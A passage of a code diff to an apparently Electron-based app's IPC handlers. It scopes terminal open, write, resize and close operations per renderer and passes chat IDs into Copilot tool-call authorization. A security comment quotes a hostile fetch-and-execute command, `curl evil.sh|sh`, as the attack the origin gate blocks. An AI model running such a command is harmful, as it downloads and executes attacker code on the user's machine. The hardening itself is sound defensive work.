+      denied: { tabs: [], activeTerminalId: null },
+      handler: (sender, rawFrom, rawTo) => {
+        const from = parseDesktopScope(rawFrom)
+        const to = parseDesktopScope(rawTo)
+        const contents = sender as WebContents
+        if (
+          !from ||
+          !isPendingDesktopScopeId(from) ||
+          !to ||
+          isPendingDesktopScopeId(to) ||
+          !terminalPendingScopesBySender.get(contents)?.has(from) ||
+          !deps.terminal.migrateScope(from, to)
+        ) {
+          return { tabs: [], activeTerminalId: null }
+        }
+        consumePendingScope(terminalPendingScopesBySender, contents, from)
+        if (terminalScopeBySender.get(contents) === from) {
+          terminalScopeBySender.set(contents, to)
+          deps.scopeEvents.activateTerminal(contents, to)
+        }
+        return { ...deps.terminal.peekTabs(to), scopeId: to }
+      },
+    },
+    'terminal:dispose-scope': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'terminal',
+      denied: false,
+      handler: (rawScope) => {
+        const scope = parseDesktopScope(rawScope)
+        if (!scope || !isPendingDesktopScopeId(scope)) return false
+        deps.terminal.disposeScope(scope)
+        return true
+      },
+    },
+    'terminal:suspend-scope': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'terminal',
+      denied: false,
+      handler: (rawScope) => {
+        const scope = parseDesktopScope(rawScope)
+        if (!scope || isPendingDesktopScopeId(scope)) return false
+        const suspended = deps.terminal.suspendScope(scope)
+        if (suspended) {
+          deps.scopeEvents.sendTerminal(scope, 'terminal:scope-suspended', scope)
+        }
+        return suspended
+      },
     },
     'terminal:open': {
       kind: 'invoke',
       gate: 'app-origin',
       requires: 'terminal',
+      passSender: true,
       denied: { tabs: [], activeTerminalId: null },
-      handler: (cwd) => deps.terminal.openTerminal(typeof cwd === 'string' ? cwd : undefined),
+      handler: (sender, cwd, rawScope) => {
+        const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
+        return scope
+          ? {
+              ...deps.terminal.openTerminal(scope, typeof cwd === 'string' ? cwd : undefined),
+              scopeId: scope,
+            }
+          : { tabs: [], activeTerminalId: null }
+      },
     },
     'terminal:switch': {
       kind: 'invoke',
       gate: 'app-origin',
       requires: 'terminal',
+      passSender: true,
       denied: { tabs: [], activeTerminalId: null },
-      handler: (terminalId) =>
-        typeof terminalId === 'string'
-          ? deps.terminal.switchTerminal(terminalId)
-          : deps.terminal.getTabs(),
+      handler: (sender, terminalId, rawScope) => {
+        const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
+        if (!scope) return { tabs: [], activeTerminalId: null }
+        const tabs =
+          typeof terminalId === 'string'
+            ? deps.terminal.switchTerminal(scope, terminalId)
+            : deps.terminal.getTabs(scope)
+        return { ...tabs, scopeId: scope }
+      },
     },
     'terminal:close': {
       kind: 'invoke',
       gate: 'app-origin',
       requires: 'terminal',
+      passSender: true,
       denied: { tabs: [], activeTerminalId: null },
-      handler: (terminalId) =>
-        typeof terminalId === 'string'
-          ? deps.terminal.closeTerminal(terminalId)
-          : deps.terminal.getTabs(),
+      handler: (sender, terminalId, rawScope) => {
+        const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
+        if (!scope) return { tabs: [], activeTerminalId: null }
+        const tabs =
+          typeof terminalId === 'string'
+            ? deps.terminal.closeTerminal(scope, terminalId)
+            : deps.terminal.getTabs(scope)
+        return { ...tabs, scopeId: scope }
+      },
     },
     'terminal:write': {
       kind: 'send',
       gate: 'app-origin',
       requires: 'terminal',
-      handler: (terminalId, data) => {
-        if (typeof terminalId !== 'string' || typeof data !== 'string') return
-        deps.terminal.write(terminalId, data)
+      passSender: true,
+      handler: (sender, terminalId, data, rawScope) => {
+        const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
+        if (!scope || typeof terminalId !== 'string' || typeof data !== 'string') return
+        deps.terminal.write(scope, terminalId, data)
       },
       // An XSS'd or hostile origin must not reach `write(id, 'curl evil.sh|sh\r')`.
       // Panel focus is deliberately not used — `terminal:focused` is a
@@ -1005,13 +1584,16 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       kind: 'send',
       gate: 'app-origin',
       requires: 'terminal',
-      handler: (terminalId, cols, rows) => {
+      passSender: true,
+      handler: (sender, terminalId, cols, rows, rawScope) => {
         // `typeof NaN === 'number'`, and the downstream `cols <= 0` guard is
         // false for NaN, so an unfinite value reached pty.resize() intact.
         // Matches the clamping terminal:start already applies to these fields.
         if (typeof terminalId !== 'string') return
         if (!isPositiveFinite(cols) || !isPositiveFinite(rows)) return
-        deps.terminal.resize(terminalId, toCellCount(cols, 1), toCellCount(rows, 1))
+        const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
+        if (!scope) return
+        deps.terminal.resize(scope, terminalId, toCellCount(cols, 1), toCellCount(rows, 1))
       },
     },
     'terminal:dispose': {
@@ -1039,10 +1621,7 @@ export function registerIpcHandlers(deps: IpcDeps): void {
   const featureAllowed = (feature: ChannelFeature | undefined): boolean => {
     if (!feature) return true
     const preferences = deps.settings.getPreferences()
-    // Absent means on: the surfaces predate the preference.
-    return feature === 'browser'
-      ? preferences.browserEnabled !== false
-      : preferences.terminalEnabled !== false
+    return feature === 'browser' ? preferences.browserEnabled : preferences.terminalEnabled
   }
 
   for (const [channel, spec] of Object.entries(channels)) {
@@ -1067,7 +1646,7 @@ export function registerIpcHandlers(deps: IpcDeps): void {
               error: 'This browser action is not an authorized pending Copilot tool call.',
             }
           }
-          handlerArgs = [authorization.toolName, authorization.args]
+          handlerArgs = [authorization.chatId, authorization.toolName, authorization.args]
         }
         if (channel === 'terminal:execute-tool') {
           const requestedTool = args[1]
@@ -1085,7 +1664,7 @@ export function registerIpcHandlers(deps: IpcDeps): void {
           }
           // The command executed is the one the server has on file for this
           // tool call, never the one the renderer passed in.
-          handlerArgs = [args[0], authorization.toolName, authorization.args]
+          handlerArgs = [authorization.chatId, args[0], authorization.toolName, authorization.args]
         }
         if (
           channel === 'desktop:local-filesystem' &&
